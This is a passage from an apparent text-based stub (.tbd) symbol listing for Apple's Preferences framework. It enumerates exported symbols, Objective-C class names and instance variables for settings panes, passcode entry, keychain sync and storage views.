                            _PSCapacityBarTitleTextColorKey, _PSCellClassKey,
                            _PSCellularDataPlanCapability, _PSCellularPlanKey,
                            _PSCellularPlanReferenceKey, _PSCityForSpecifier,
                            _PSCityForTimeZone,
                            _PSCloudFamilyRestrictionsControllerForDSID,
                            _PSColorCodedSerialNumber, _PSConfigString,
                            _PSConfirmationActionKey, _PSConfirmationAltKey,
                            _PSConfirmationAlternateActionKey,
                            _PSConfirmationAlternateDestructiveKey,
                            _PSConfirmationCancelActionKey,
                            _PSConfirmationCancelKey,
                            _PSConfirmationDestructiveKey, _PSConfirmationKey,
                            _PSConfirmationOKKey, _PSConfirmationPromptKey,
                            _PSConfirmationTitleKey, _PSConnected298,
                            _PSContainerBundleIDKey, _PSControlIsLoadingKey,
                            _PSControlKey, _PSControlMaximumKey,
                            _PSControlMinimumKey, _PSControllerItemsKey,
                            _PSControllerLoadActionKey, _PSControllerTitleKey,
                            _PSCopyableCellKey,
                            _PSCoreSpolightIndexInExtensionKey,
                            _PSCoreSpolightSkipInternalManifestsKey,
                            _PSCoreUIArtworkDeviceSubtype,
                            _PSCreateSecTrustFromCertificateChain,
                            _PSCurrentCallTypes, _PSDataSourceClassKey,
                            _PSDatePickerInlineKey, _PSDecimalKeyboardKey,
                            _PSDefaultValueKey, _PSDefaultsKey,
                            _PSDeferItemSelectionKey, _PSDeletionActionKey,
                            _PSDetailControllerClassKey,
                            _PSDeveloperSettingsCapability, _PSDeviceClass,
                            _PSDeviceSubTypeString, _PSDeviceUDID,
                            _PSDiagnosticsAreEnabled, _PSDisplayNameForBBSection,
                            _PSDisplaySortedByTitleKey, _PSDisplayZoomCapability,
                            _PSDocumentBundleIdentifierKey, _PSEditPaneClassKey,
                            _PSEditableTableCellTextFieldShouldPopOnReturn,
                            _PSEditingCellHorizontalInset,
                            _PSEmailAddressKeyboardKey,
                            _PSEmailAddressingKeyboardKey, _PSEnabledKey,
                            _PSEthernetChangedNotification,
                            _PSExposureNotificationsCapability,
                            _PSFaceIDPrivacyText, _PSFindViewOfClass,
                            _PSFooterAlignmentGroupKey,
                            _PSFooterCellClassGroupKey,
                            _PSFooterHyperlinkViewActionKey,
                            _PSFooterHyperlinkViewLinkRangeKey,
                            _PSFooterHyperlinkViewTargetKey,
                            _PSFooterHyperlinkViewTitleKey,
                            _PSFooterHyperlinkViewURLKey, _PSFooterTextGroupKey,
                            _PSFooterViewKey, _PSFormattedTimeString,
                            _PSFormattedTimeStringWithDays,
                            _PSGestureRecognizers, _PSGetCapabilityBoolAnswer,
                            _PSGetterKey, _PSHasStockholmPass,
                            _PSHeaderCellClassGroupKey,
                            _PSHeaderDetailTextGroupKey, _PSHeaderViewKey,
                            _PSHidesDisclosureIndicatorKey,
                            _PSHighLegibilityAlternateFont,
                            _PSHomeScreenPhoneCapability, _PSIDKey,
                            _PSIPKeyboardKey, _PSIconImageKey,
                            _PSIconImageShouldFlipForRightToLeftCalendarKey,
                            _PSIconImageShouldFlipForRightToLeftKey,
                            _PSIconImageShouldLoadAlternateImageForRightToLeftKey,
                            _PSInEDUModeCapability, _PSInStoreDemoModeCapability,
                            _PSIndiaBISNumber, _PSIsAppIdSiriKitTCCEnabled,
                            _PSIsAudioAccessory,
                            _PSIsBundleIDHiddenDueToRestrictions,
                            _PSIsBundleIDInstalled, _PSIsD22ScreenSize,
                            _PSIsD33OrN84ScreenSize, _PSIsDebug,
                            _PSIsGreenTeaCapable, _PSIsHostingPersonalHotspot,
                            _PSIsInEDUMode, _PSIsInternalInstall, _PSIsJ99,
                            _PSIsKeychainSecureBackupEnabled,
                            _PSIsLocationRestricted, _PSIsLoggingEnabled, _PSIsN56,
                            _PSIsNanoMirroringDomain, _PSIsPearlAvailable,
                            _PSIsPearlInterlocked, _PSIsPerGizmoKey,
                            _PSIsRadioGroupKey, _PSIsRunningInAssistant,
                            _PSIsSkippedInEDUModeKey,
                            _PSIsSpecifierHiddenDueToRestrictions,
                            _PSIsTelephonyDead, _PSIsThirdPartyDetailKey,
                            _PSIsTopLevelKey, _PSIsUsingPasscode, _PSIsiPad,
                            _PSIsiPhone, _PSKeyNameKey, _PSKeyboardTypeKey,
                            _PSKeychainSyncErrorDomain,
                            _PSKeychainSyncGetCircleMembershipStatus,
                            _PSKeychainSyncGetStatus, _PSKeychainSyncIsUsingICDP,
                            _PSKillProcessNamed, _PSLazilyLoadedBundleKey,
                            _PSLazyIconAppID, _PSLazyIconDontUnload,
                            _PSLazyIconLoading, _PSLazyIconLoadingCustomQueue,
                            _PSLazyIconURL, _PSLegacyCityFromCity,
                            _PSLicenseFilePath, _PSLicensePath,
                            _PSLightningAdapterCapability,
                            _PSListItemsValuesAreAppIDsKey,
                            _PSListeningExperienceCapability,
                            _PSLocaleLanguageDirection, _PSLocaleUses24HourClock,
                            _PSLocalizableMesaStringForKey,
                            _PSLocalizablePearlStringForKey,
                            _PSLocalizableStockholmStringForKey,
                            _PSLocalizedStringFromTableInBundleForLanguage,
                            _PSLog, _PSManifestEntriesKey, _PSManifestSectionKey,
                            _PSManifestStringTableKey, _PSMarginWidthKey,
                            _PSMigrateSoundsDefaults_10_0,
                            _PSMultipickerStringsName,
                            _PSNETRBChangedNotification,
                            _PSNavigationControllerWillShow,
                            _PSNavigationControllerWillShowAppearing,
                            _PSNavigationControllerWillShowDisappearing,
                            _PSNavigationControllerWillShowOperationType,
                            _PSNegateValueKey, _PSNightShiftCapability,
                            _PSNotifyNanoKey, _PSNumberKeyboardKey,
                            _PSOverrideDevicePasscodeEntryPresetKey,
                            _PSPIDForProcessNamed, _PSPaneTitleKey,
                            _PSPassbookImage, _PSPencilCapability,
                            _PSPictureInPictureCapability, _PSPlaceholderKey,
                            _PSPlantCode, _PSPlistNameKey, _PSPointImageOfColor,
                            _PSPreferencesFrameworkBundle,
                            _PSPreferencesLaunchURL,
                            _PSPreferencesUIFrameworkBundle,
                            _PSPreferredLanguageIsEnglish,
                            _PSPrioritizeValueTextDisplayKey,
                            _PSPurpleBuddyIdentifier,
                            _PSRadioGroupCheckedSpecifierKey,
                            _PSRaiseToWakeCapability, _PSRegulatoryImage,
                            _PSRequiredCapabilitiesKey,
                            _PSRequiredCapabilitiesOrKey,
                            _PSRerootPreferencesNavigationNotification,
                            _PSResetCachedSiriKitTCCEnabledAppIds,
                            _PSRootControllerDidSuspendNotification,
                            _PSRoundRectToPixel, _PSRoundToPixel,
                            _PSScreenClassString, _PSSearchInlineTogglesEnabled,
                            _PSSearchNanoApplicationsBundlePath,
                            _PSSearchNanoInternalSettingsBundlePath,
                            _PSSearchNanoSettingsBundlePath,
                            _PSSecureBackupAccountInfo,
                            _PSSelectedTintedImageFromMask,
                            _PSSetBatteryMonitoringEnabled,
                            _PSSetCustomWatchCapabilityCheck,
                            _PSSetLoggingEnabled, _PSSetterKey,
                            _PSSetupAssistantNeedsToRun, _PSSetupCustomClassKey,
                            _PSSetupFinishedAllStepsKey,
                            _PSShortFormattedTimeString,
                            _PSShortTitlesDataSourceKey, _PSShortTitlesKey,
                            _PSShouldShowIndiaBIS, _PSShowEnableKeychainSync,
                            _PSShowKeychainSyncRecovery,
                            _PSShowStorageCapability,
                            _PSShowVideoDownloadsCapability, _PSSimIsRequired,
                            _PSSiriImage, _PSSiriKitTCCEnabledAppIds,
                            _PSSliderIsContinuous, _PSSliderIsSegmented,
                            _PSSliderLeftImageKey, _PSSliderLeftImagePromiseKey,
                            _PSSliderLocksToSegment, _PSSliderRightImageKey,
                            _PSSliderRightImagePromiseKey, _PSSliderSegmentCount,
                            _PSSliderShowValueKey, _PSSliderSnapsToSegment,
                            _PSSpeciferForThirdPartyBundle,
                            _PSSpecifierActionKey, _PSSpecifierAttributesKey,
                            _PSSpecifierAuthenticationTokenKey,
                            _PSSpecifierForThirdPartyBundle,
                            _PSSpecifierIsSearchableKey,
                            _PSSpecifierIsSectionKey, _PSSpecifierPasscodeKey,
                            _PSSpecifierSearchBundleKey,
                            _PSSpecifierSearchContentDescriptionKey,
                            _PSSpecifierSearchDetailPath,
                            _PSSpecifierSearchKeywordsKey,
                            _PSSpecifierSearchPlistKey,
                            _PSSpecifierSearchSectionID,
                            _PSSpecifierSearchSectionIDKey,
                            _PSSpecifierSearchTitleKey, _PSSpecifierSearchURL,
                            _PSSpecifierSearchURLKey,
                            _PSSpecifierSupportsSearchToggleKey,
                            _PSSpecifiersKey, _PSStaticHeaderTextKey,
                            _PSStaticTextMessageKey,
                            _PSStockholmLocallyStoredValuePassNames,
                            _PSStorageAndBackupClass, _PSStorageClass,
                            _PSStringForDays, _PSStringForHours, _PSStringForMins,
                            _PSStringForMinutes, _PSStringsBundleIDKey,
                            _PSStringsBundlePathKey, _PSStringsKey,
                            _PSStringsTableKey, _PSSubscriptionContextKey,
                            _PSSupportedOrientations,
                            _PSSupportsAccountSettingsDataclassesKey,
                            _PSSupportsMesa, _PSTTYCapability,
                            _PSTableCellAlwaysShowSeparator,
                            _PSTableCellClassKey, _PSTableCellHeightKey,
                            _PSTableCellKey, _PSTableCellSubtitleColorKey,
                            _PSTableCellSubtitleTextKey,
                            _PSTableCellUseEtchedAppearanceKey,
                            _PSTableSectionFooterBottomPad,
                            _PSTableSectionFooterTopPad, _PSTableViewSideInset,
                            _PSTableViewSideInsetPad,
                            _PSTextFieldNoAutoCorrectKey,
                            _PSTextViewBottomMarginKey, _PSTextViewInsets,
                            _PSTimeStringIsShortened,
                            _PSTimeZoneArrayForSpecifier,
                            _PSTimeZoneArrayForTimeZone, _PSTintedIcon,
                            _PSTintedImageFromMask, _PSTitleKey,
                            _PSTitlesDataSourceKey, _PSToolbarLabelsTextColor,
                            _PSTopLevelCellKey, _PSTrackpadAndMouseCapability,
                            _PSTrackpadOnlyCapability,
                            _PSUISupportsDocumentBrowser, _PSURLKeyboardKey,
                            _PSUsageBundleAppKey, _PSUsageBundleCategoryKey,
                            _PSUsageBundleDeletingKey,
                            _PSUseHighLegibilityAlternateKey,
                            _PSUsedByHSA2Account, _PSUsedByManagedAccount,
                            _PSUsesAlternateSelectionStyleKey, _PSValidTitlesKey,
                            _PSValidValuesKey, _PSValueChangedNotificationKey,
                            _PSValueKey, _PSValuesDataSourceKey,
                            _PSWalletApplePayCapability, _PSWarrantyFilePath,
                            _PSWarrantyPath, _PSWeekOfManufacture,
                            _PSWifiChangedNotification, _PSWifiNameKey,
                            _PSWifiPowerStateKey, _PSWifiTetheringStateKey,
                            _PSYearOfManufacture, _PathKey,
                            _PreferencesTableViewCellLeftPad,
                            _PreferencesTableViewCellRightPad,
                            _PreferencesTableViewFooterColor,
                            _PreferencesTableViewFooterFont,
                            _PreferencesTableViewHeaderColor,
                            _PreferencesTableViewHeaderFont,
                            _ProcessedSpecifierBundle, _ProductType,
                            _SUIKCategoryFromSearchableItem,
                            _SUIKCategoryHeaderKind, _ScreenScale,
                            _SearchEntriesFromSpecifiers,
                            _SearchEntryFromSpecifier,
                            _SearchSpecifiersFromPlist, _SerializeAddCredential,
                            _SerializeCredential, _SerializeCredentialList,
                            _SerializeGetContextProperty, _SerializeProcessAcl,
                            _SerializeRemoveCredential,
                            _SerializeReplacePassphraseCredential,
                            _SerializeRequirement, _SerializeVerifyAclConstraint,
                            _SerializeVerifyPolicy, _SetDeviceName,
                            _ShouldShowBuiltInApps, _ShouldShowRoHSCompliance,
                            _ShouldShowWeibo, _ShouldShowYearOfManufacture,
                            _ShowInNotificationsState, _SpecifiersFromPlist,
                            _SystemHasCapabilities,
                            _TopToBottomLeftToRightViewCompare, _UsageSizeKey,
                            _UserInterfaceIdiom, _Util_GetBitCount,
                            _Util_hexDumpToStrHelper, _Util_isNonNullEqualMemory,
                            _Util_isNullOrZeroMemory, _WifiStateChanged,
                            __MCFeatureHandWashingDataSubmissionAllowed,
                            __PSFindViewRecursively,
                            __PSIsValueRestrictedByMCFeature,
                            __PSLoggingFacility, ___init_sirikit_enabled_lock,
                            __clearKeychainSyncCache, __consuming_xpc_release,
                            __screenScale, _gAllocatedBytes, _gLastAllocatedBytes,
                            _kDevicePINControllerDelegate, _kDevicePINMode,
                            _kHeaderHorizontalMargin,
                            _kKeychainSyncCountryInfoKey,
                            _kKeychainSyncPhoneNumberKey,
                            _kKeychainSyncSecurityCodeAdvancedOptionsResult,
                            _kKeychainSyncSecurityCodeKey,
                            _kKeychainSyncSecurityCodePeerApprovalResult,
                            _kKeychainSyncSecurityCodeResetKeychainResult,
                            _kKeychainSyncSecurityCodeSetUpLaterResult,
                            _kKeychainSyncSecurityCodeTypeKey,
                            _kKeychainSyncSpinnerKey,
                            _kNumberOfPasscodeFieldsProperty,
                            _kPSLargeTextUsesExtendedRangeKey,
                            _kTCCBluetoothSharingID, _kTCCCalendarsID,
                            _kTCCCameraID, _kTCCContactsID,
                            _kTCCExposureNotification, _kTCCFaceID,
                            _kTCCLiverpoolID, _kTCCMediaLibraryID,
                            _kTCCMicrophoneID, _kTCCMotionID, _kTCCPhotosID,
                            _kTCCRemindersID, _kTCCSpeechRecognitionID,
                            _kTCCWebKitIntelligentTrackingPreventionID,
                            _kTCCWillowID, _kWantsIcon, _resetLocale,
                            _s_sirikit_enabled_lock ]
    objc-classes:         [ _AlphanumericPINTableViewCell,
                            _AlphanumericPINTextField, _DevicePINController,
                            _DevicePINKeypad, _DevicePINKeypadContainerView,
                            _DevicePINPane, _DevicePINSetupController,
                            _DiagnosticDataController, _FailureBarView,
                            _FontSizeSliderCell,
                            _KeychainSyncAdvancedSecurityCodeController,
                            _KeychainSyncAppleSupportController,
                            _KeychainSyncCountryInfo,
                            _KeychainSyncDevicePINController,
                            _KeychainSyncPhoneNumberController,
                            _KeychainSyncPhoneSettingsFragment,
                            _KeychainSyncSMSVerificationController,
                            _KeychainSyncSecurityCodeCell,
                            _KeychainSyncSetupController,
                            _LargeTextExplanationView, _LargerSizesHelpTextView,
                            _PINOptionsButton, _PINView, _PKBiometrics,
                            _PKIconImageCache, _PSAboutHTMLSheetViewController,
                            _PSAboutTextSheetViewController,
                            _PSAccessibilitySettingsDetail, _PSAccountEnumerator,
                            _PSAccountSecurityController,
                            _PSAccountsClientListCell,
                            _PSAccountsClientListController,
                            _PSAccountsLinkSpecifier,
                            _PSAirplaneModeSettingsDetail, _PSAppListController,
                            _PSAppleIDSplashViewController,
                            _PSAssistiveTouchSettingsDetail,
                            _PSAudioTransparencySettingsDetail,
                            _PSAutoLockSettingsDetail, _PSBadgedTableCell,
                            _PSBarButtonSpinnerView, _PSBiometricIdentity,
                            _PSBluetoothSettingsDetail, _PSBrightnessController,
                            _PSBrightnessSettingsDetail, _PSBulletedPINView,
                            _PSBundleController, _PSCapabilityManager,
                            _PSCapacityBarCategory, _PSCapacityBarCell,
                            _PSCapacityBarData, _PSCapacityBarLegendView,
                            _PSCapacityBarView, _PSCastleSettingsDetail,
                            _PSCellularDataSettingsDetail,
                            _PSClearBackgroundCell, _PSCloudStorageOffersManager,
                            _PSCloudStorageQuotaManager,
                            _PSCommandAndControlSettingsDetail,
                            _PSCompassSettingsDetail, _PSConfirmationSpecifier,
                            _PSContactsPolicyController,
                            _PSControlCenterSettingsDetail, _PSControlTableCell,
                            _PSCoreSpotlightIndexer, _PSDUETSettingsDetail,
                            _PSDateTimePickerCell, _PSDeleteButtonCell,
                            _PSDetailController, _PSDocumentsPolicyController,
                            _PSEditableListController, _PSEditableTableCell,
                            _PSEditingPane, _PSExpandableAppListGroup,
                            _PSExpandableListGroup, _PSFaceTimeSettingsDetail,
                            _PSFitnessPlusAnalyticsConsentCoordinator,
                            _PSFooterHyperlinkView, _PSGameCenterSettingsDetail,
                            _PSGuidedAccessSettingsDetail,
                            _PSIconMarginTableCell, _PSInternationalController,
                            _PSInternationalLanguageController,
                            _PSInternationalLanguageSetupController,
                            _PSInvertColorsSettingsDetail,
                            _PSKeyboardNavigationSearchBar,
                            _PSKeyboardNavigationSearchController,
                            _PSKeyboardSettingsDetail, _PSKeychainSyncHeaderView,
                            _PSKeychainSyncManager, _PSKeychainSyncPhoneNumber,
                            _PSKeychainSyncSecurityCodeController,
                            _PSKeychainSyncTextEntryController,
                            _PSKeychainSyncViewController, _PSLanguage,
                            _PSLanguageSelector, _PSLargeTextController,
                            _PSLargeTextSliderListController,
                            _PSLazyImagePromise, _PSLegalMessagePane,
                            _PSLegendColorView, _PSListController,
                            _PSListItemsController, _PSLocaleController,
                            _PSLocaleSelector, _PSLocationServicesSettingsDetail,
                            _PSLowPowerModeSettingsDetail, _PSMCCSettingsDetail,
                            _PSMapsSettingsDetail, _PSMessagesSettingsDetail,
                            _PSMigratorUtilities, _PSMusicSettingsDetail,
                            _PSNavBarSpinnerManager,
                            _PSNoiseCancellationSettingsDetail,
                            _PSNonMovableTapGestureRecognizer,
                            _PSNotesSettingsDetail,
                            _PSNotificationSettingsController,
                            _PSNotificationSettingsDetail,
                            _PSOAuthAccountRedirectURLController,
                            _PSPasscodeField, _PSPasscodeSettingsDetail,
                            _PSPhoneNumberSpecifier, _PSPhoneNumberTableCell,
                            _PSPhoneSettingsDetail,
                            _PSPhotoServicesAuthorizationLevelController,
                            _PSPhotosAndCameraSettingsDetail,
                            _PSPhotosPolicyController, _PSPowerlogListController,
                            _PSPrivacySettingsDetail, _PSQuotaInfo, _PSRegion,
                            _PSRemindersSettingsDetail,
                            _PSRestrictionsController,
                            _PSRestrictionsPINController,
                            _PSRestrictionsPasscodeController,
                            _PSReversedSubtitleDisclosureTableCell,
                            _PSRootController, _PSSafariSettingsDetail,
                            _PSSearchController, _PSSearchEntry,
                            _PSSearchIndexOperation, _PSSearchModel,
                            _PSSearchOperation, _PSSearchResults,
                            _PSSearchResultsCell, _PSSearchResultsController,
                            _PSSearchableItem, _PSSearchableItemManifest,
                            _PSSegmentTableCell, _PSSegmentableSlider,
                            _PSSettingsFunctions, _PSSetupController,
                            _PSSharableDetailController, _PSSimulatedCrash,
                            _PSSiriSettingsDetail, _PSSliderTableCell,
                            _PSSoftwareUpdateAnimatedIcon,
                            _PSSoftwareUpdateLicenseViewController,
                            _PSSoftwareUpdateReleaseNotesDetail,
                            _PSSoftwareUpdateTableView,
                            _PSSoftwareUpdateTermsManager,
                            _PSSoftwareUpdateTitleCell, _PSSoundsSettingsDetail,
                            _PSSpecifier, _PSSpecifierAction,
                            _PSSpecifierController, _PSSpecifierDataSource,
                            _PSSpecifierGroupIndex, _PSSpecifierUpdateContext,
                            _PSSpecifierUpdateOperation, _PSSpecifierUpdates,
                            _PSSpinnerRecord, _PSSpinnerTableCell,
                            _PSSplitViewController,
                            _PSSpotlightSearchResultsController,
                            _PSStackPushAnimationController,
                            _PSStorageAppHeaderCell, _PSStoreSettingsDetail,
                            _PSSubtitleDisclosureTableCell,
                            _PSSubtitleSwitchTableCell, _PSSwitchTableCell,
                            _PSSystemConfiguration,
                            _PSSystemConfigurationDynamicStoreEthernetWatcher,
                            _PSSystemConfigurationDynamicStoreNETRBWatcher,
                            _PSSystemConfigurationDynamicStoreWifiWatcher,
                            _PSSystemPolicyForApp, _PSSystemPolicyManager,
                            _PSTableCell, _PSTableCellHighlightContext,
                            _PSTextEditingCell, _PSTextEditingPane,
                            _PSTextFieldPINView, _PSTextFieldSpecifier,
                            _PSTextSizeSettingsDetail, _PSTextView,
                            _PSTextViewPane, _PSTextViewTableCell,
                            _PSThirdPartyApp, _PSThirdPartyAppController,
                            _PSThirdPartyAppViewController,
                            _PSThirdPartySettingsDetail, _PSTimeRangeCell,
                            _PSTimeZoneController, _PSTimeZoneTableCell,
                            _PSTorchSettingsDetail, _PSTrackingWelcomeController,
                            _PSUISearchController, _PSURLControllerHandler,
                            _PSURLManager, _PSUsageBundleApp,
                            _PSUsageBundleCategory, _PSUsageBundleCell,
                            _PSUsageBundleDetailController,
                            _PSUsageBundleManager, _PSUsageSizeHeader,
                            _PSVideoSubscriberPrivacyCell,
                            _PSVideosSettingsDetail, _PSViewController,
                            _PSVoiceOverSettingsDetail, _PSWeakReference,
                            _PSWebContainerView, _PSWiFiSettingsDetail,
                            _PasscodeFieldCell, _PrefsUILinkLabel,
                            _ProblemReportingAboutController,
                            _ProblemReportingController,
                            _SUIKSearchResultCollectionViewListCell,
                            _SUIKSearchResultCollectionViewSectionHeader,
                            _SUIKSearchResultsCollectionViewController,
                            __PSDeferredUpdates,
                            __PSSpinnerHandlingNavigationController,
                            __PSSpinnerViewController,
                            __SUIKSearchResultsUpdateOperation ]
    objc-ivars:           [ _AlphanumericPINTableViewCell._pinTextField,
                            _DevicePINController._allowOptionsButton,
                            _DevicePINController._cancelButton,
                            _DevicePINController._doneButton,
                            _DevicePINController._doneButtonTitle,
                            _DevicePINController._error1,
                            _DevicePINController._error2,
                            _DevicePINController._hasBeenDismissed,
                            _DevicePINController._hidesCancelButton,
                            _DevicePINController._hidesNavigationButtons,
                            _DevicePINController._lastEntry,
                            _DevicePINController._mode,
                            _DevicePINController._nextButton,
                            _DevicePINController._numericPIN,
                            _DevicePINController._oldPassword,
                            _DevicePINController._passcodeOptionsHandler,
                            _DevicePINController._passcodeOptionsTitle,
                            _DevicePINController._pinDelegate,
                            _DevicePINController._pinLength,
                            _DevicePINController._requiresKeyboard,
                            _DevicePINController._sepLockInfo,
                            _DevicePINController._sepOnceToken,
                            _DevicePINController._shouldDismissWhenDone,
                            _DevicePINController._simplePIN,
                            _DevicePINController._substate,
                            _DevicePINController._success,
                            _DevicePINController._useSEPLockInfo,
                            _DevicePINKeypadContainerView._backdropView,
                            _DevicePINKeypadContainerView._iPadKeypadHeight,
                            _DevicePINKeypadContainerView._keypad,
                            _DevicePINPane._PINLength,
                            _DevicePINPane._autocapitalizationType,
                            _DevicePINPane._autocorrectionType,
                            _DevicePINPane._isBlocked,
                            _DevicePINPane._keyboardAppearance,
                            _DevicePINPane._keyboardType, _DevicePINPane._keypad,
                            _DevicePINPane._keypadActive,
                            _DevicePINPane._keypadContainerView,
                            _DevicePINPane._numericKeyboard,
                            _DevicePINPane._passcodeOptionsHandler,
                            _DevicePINPane._passcodeOptionsTitle,
                            _DevicePINPane._pinView, _DevicePINPane._playSound,
                            _DevicePINPane._simplePIN,
                            _DevicePINPane._transitionView,
                            _DevicePINPane._transitioning,
                            _DevicePINSetupController._allowOptionsButton,
                            _DevicePINSetupController._success,
                            _DiagnosticDataController._allSpecifiers,
                            _DiagnosticDataController._searchController,
                            _FailureBarView._titleLabel,
                            _KeychainSyncAdvancedSecurityCodeController._cellFont,
                            _KeychainSyncAdvancedSecurityCodeController._cellTextWidth,
                            _KeychainSyncAdvancedSecurityCodeController._showsDisableRecoveryOption,
                            _KeychainSyncCountryInfo._countryCode,
                            _KeychainSyncCountryInfo._countryName,
                            _KeychainSyncCountryInfo._dialingPrefix,
                            _KeychainSyncCountryInfo._localizedCountryName,
                            _KeychainSyncDevicePINController._devicePINController,
                            _KeychainSyncDevicePINController._disabledKeyboard,
                            _KeychainSyncDevicePINController._enterPasscodeReason,
                            _KeychainSyncDevicePINController._enterPasscodeTitle,
                            _KeychainSyncDevicePINController._showingBlockedMessage,
                            _KeychainSyncPhoneNumberController._footerLabel,
                            _KeychainSyncPhoneNumberController._phoneSettingsFragment,
                            _KeychainSyncPhoneSettingsFragment._countryInfo,
                            _KeychainSyncPhoneSettingsFragment._countrySpecifier,
                            _KeychainSyncPhoneSettingsFragment._delegate,
                            _KeychainSyncPhoneSettingsFragment._listController,
                            _KeychainSyncPhoneSettingsFragment._phoneNumber,
                            _KeychainSyncPhoneSettingsFragment._phoneNumberSpecifier,
                            _KeychainSyncPhoneSettingsFragment._specifiers,
                            _KeychainSyncPhoneSettingsFragment._title,
                            _KeychainSyncSMSVerificationController._countryCode,
                            _KeychainSyncSMSVerificationController._dialingPrefix,
                            _KeychainSyncSMSVerificationController._footerButton,
                            _KeychainSyncSMSVerificationController._keychainSyncManager,
                            _KeychainSyncSMSVerificationController._phoneNumber,
                            _KeychainSyncSecurityCodeCell._bulletTextLabel,
                            _KeychainSyncSecurityCodeCell._firstPasscodeEntry,
                            _KeychainSyncSecurityCodeCell._mode,
                            _KeychainSyncSecurityCodeCell._securityCodeType,
                            _KeychainSyncSetupController._manager,
                            _LargeTextExplanationView._bodyExampleLabel,
                            _LargeTextExplanationView._bodyExampleTextView,
                            _LargerSizesHelpTextView._helpLabel,
                            _PINView._delegate, _PINView._error,
                            _PINView._errorTitleLabel, _PINView._failureView,
                            _PINView._optionsButton,
                            _PINView._optionsButtonTitle,
                            _PINView._passcodeOptionsHandler,
                            _PINView._pinPolicyLabel, _PINView._titleLabel,
                            _PKBiometrics._pearlDevice,
                            _PKBiometrics._touchIDDevice,
                            _PKIconImageCache._cacheAccessQueue,
                            _PKIconImageCache._iconCache,
                            _PSAccountEnumerator._accountStore,
                            _PSAccountEnumerator._accountStoreDidChangeObserver,
                            _PSAccountEnumerator._accounts,
                            _PSAccountSecurityController._SMSTarget,
                            _PSAccountSecurityController._SMSTargetCountryInfo,
                            _PSAccountSecurityController._devicePINController,
                            _PSAccountSecurityController._devicePasscodeChangeSetupController,
                            _PSAccountSecurityController._manager,
                            _PSAccountSecurityController._passcodeSpecifiers,
                            _PSAccountSecurityController._phoneSettingsFragment,
                            _PSAccountSecurityController._recoverySwitch,
                            _PSAccountSecurityController._secureBackupEnabled,
                            _PSAccountSecurityController._securityCode,
                            _PSAccountSecurityController._securityCodeType,
                            _PSAccountsClientListController._acObserver,
                            _PSAccountsClientListController._accountSpecifier,
                            _PSAccountsClientListController._noAccountsSetUp,
                            _PSAccountsClientListController._showExtraVC,
                            _PSAccountsClientListController.accountUpdateThrottle,
                            _PSAccountsLinkSpecifier._accountEnumerator,
                            _PSAppListController._appPolicy,
                            _PSAppListController._systemPolicy,
                            _PSAppleIDSplashViewController._authController,
                            _PSAppleIDSplashViewController._cancelButtonBarItem,
                            _PSAppleIDSplashViewController._createNewAccountButtonSpecifier,
                            _PSAppleIDSplashViewController._createNewAccountGroupSpecifier,
                            _PSAppleIDSplashViewController._idleJiggleTimer,
                            _PSAppleIDSplashViewController._isPasswordDirty,
                            _PSAppleIDSplashViewController._isPresentedModally,
                            _PSAppleIDSplashViewController._nextButtonBarItem,
                            _PSAppleIDSplashViewController._password,
                            _PSAppleIDSplashViewController._passwordHandler,
                            _PSAppleIDSplashViewController._passwordSpecifier,
                            _PSAppleIDSplashViewController._powerAssertion,
                            _PSAppleIDSplashViewController._remoteUICompletion,
                            _PSAppleIDSplashViewController._remoteUIController,
                            _PSAppleIDSplashViewController._shouldHideBackButton,
                            _PSAppleIDSplashViewController._shouldShowCreateAppleIDButton,
                            _PSAppleIDSplashViewController._signInButtonSpecifier,
                            _PSAppleIDSplashViewController._spinner,
                            _PSAppleIDSplashViewController._spinnerBarItem,
                            _PSAppleIDSplashViewController._textFieldTextDidChangeObserver,
                            _PSAppleIDSplashViewController._userSpecifier,
                            _PSAppleIDSplashViewController._username,
                            _PSBadgedTableCell._badgeImageView,
                            _PSBadgedTableCell._badgeInt,
                            _PSBadgedTableCell._badgeNumberLabel,
                            _PSBarButtonSpinnerView._spinner,
                            _PSBrightnessController._brightnessChangedExternally,
                            _PSBrightnessController._isTracking,
                            _PSBulletedPINView._passcodeField,
                            _PSBundleController._parent,
                            _PSCapabilityManager._overrideForAllBoolValues,
                            _PSCapabilityManager._overrides,
                            _PSCapacityBarCategory._bytes,
                            _PSCapacityBarCategory._color,
                            _PSCapacityBarCategory._identifier,
                            _PSCapacityBarCategory._title,
                            _PSCapacityBarCell._barHeightConstraint,
                            _PSCapacityBarCell._barView,
                            _PSCapacityBarCell._bigFont,
                            _PSCapacityBarCell._commonConstraints,
                            _PSCapacityBarCell._forceLoading,
                            _PSCapacityBarCell._hideLegend,
                            _PSCapacityBarCell._largeConstraints,
                            _PSCapacityBarCell._legendConstraints,
                            _PSCapacityBarCell._legendFont,
                            _PSCapacityBarCell._legendTextColor,
                            _PSCapacityBarCell._legendView,
                            _PSCapacityBarCell._legends,
                            _PSCapacityBarCell._loadingLabel,
                            _PSCapacityBarCell._normalConstraints,
                            _PSCapacityBarCell._otherLegend,
                            _PSCapacityBarCell._showOtherLegend,
                            _PSCapacityBarCell._sizeFormat,
                            _PSCapacityBarCell._sizeLabel,
                            _PSCapacityBarCell._sizesAreMem,
                            _PSCapacityBarCell._tableWidth,
                            _PSCapacityBarCell._titleLabel,
                            _PSCapacityBarData._adjustedCategories,
                            _PSCapacityBarData._bytesUsed,
                            _PSCapacityBarData._capacity,
                            _PSCapacityBarData._categories,
                            _PSCapacityBarData._categoryLimit,
                            _PSCapacityBarData._hideTinyCategories,
                            _PSCapacityBarData._orderedCategories,
                            _PSCapacityBarData._sortStyle,
                            _PSCapacityBarLegendView._legendColor,
                            _PSCapacityBarLegendView._legendLabel,
                            _PSCapacityBarView._barBackgroundColor,
                            _PSCapacityBarView._barData,
                            _PSCapacityBarView._barOtherDataColor,
                            _PSCapacityBarView._barSeparatorColor,
                            _PSCloudStorageOffersManager._commerceDelegate,
                            _PSCloudStorageOffersManager._delegate,
                            _PSCloudStorageOffersManager._requiredStorageThreshold,
                            _PSCloudStorageOffersManager._shouldOfferDeviceOffers,
                            _PSCloudStorageOffersManager._shouldOfferFamilySharePlansOnly,
                            _PSCloudStorageOffersManager._skipCompletionAlert,
                            _PSCloudStorageOffersManager._skipRetryWithoutToken,
                            _PSCloudStorageOffersManager._supportsModernAlerts,
                            _PSConfirmationSpecifier._alternateButton,
                            _PSConfirmationSpecifier._cancelButton,
                            _PSConfirmationSpecifier._okButton,
                            _PSConfirmationSpecifier._prompt,
                            _PSConfirmationSpecifier._title,
                            _PSContactsPolicyController._controller,
                            _PSControlTableCell._control,
                            _PSCoreSpotlightIndexer._hasItemsQuery,
                            _PSCoreSpotlightIndexer._indexFromControllerLog,
